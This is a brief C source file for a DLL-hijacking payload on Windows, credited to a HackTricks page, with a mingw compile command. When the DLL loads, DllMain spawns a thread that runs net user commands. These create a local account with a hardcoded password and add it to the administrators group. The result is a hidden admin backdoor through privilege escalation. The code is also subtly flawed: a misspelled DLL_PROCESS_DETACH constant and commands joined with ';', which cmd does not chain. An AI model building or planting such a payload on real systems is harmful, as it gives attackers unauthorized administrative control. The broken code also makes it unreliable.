// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd /c net user iamf P@ssw0rd /add; cmd /c net localgroup administrators iamf /add");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}